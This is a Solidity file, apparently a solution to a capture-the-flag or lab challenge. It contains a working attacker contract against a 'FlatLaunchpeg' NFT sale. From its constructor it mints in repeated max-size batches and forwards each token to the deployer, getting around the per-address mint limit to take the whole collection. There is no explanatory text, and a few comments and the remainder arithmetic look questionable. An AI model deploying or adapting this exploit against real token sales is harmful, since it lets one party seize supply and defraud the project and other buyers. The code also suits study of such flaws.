// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./FlatLaunchpeg.sol";


contract AttackerContract {

    constructor(address _target) {
        FlatLaunchpeg target = FlatLaunchpeg(_target);
        uint256 tokenPrice = target.salePrice();
        uint256 collectionSize = target.collectionSize();
        uint256 totalSupply = target.totalSupply();
        uint256 maxBatchSize = target.maxBatchSize();
        uint256 lastMintedTokenId;

        while (collectionSize > maxBatchSize) {
            target.publicSaleMint{value: tokenPrice * maxBatchSize}(
                maxBatchSize
            );
            for (uint i; i < maxBatchSize; ++i) {
                uint256 tokenId = lastMintedTokenId + i; // assuming nobody has minted before, making thius easier.
                target.safeTransferFrom(address(this), msg.sender, tokenId); // the numberMinted(address(this)) returns to 0, so minting is possible on the while next loop
            }
            lastMintedTokenId += maxBatchSize;
            collectionSize = collectionSize - maxBatchSize;
        }

        // mint remaining ntf
        if (collectionSize - totalSupply > 0) {
            uint256 totalRemaining = collectionSize - totalSupply;
            target.publicSaleMint{value: tokenPrice * totalRemaining}(totalRemaining);
            for (uint i; i < totalRemaining; ++i) {
                uint256 tokenId = lastMintedTokenId + i;
                target.safeTransferFrom(address(this), msg.sender, tokenId);
            }
        }
    }
}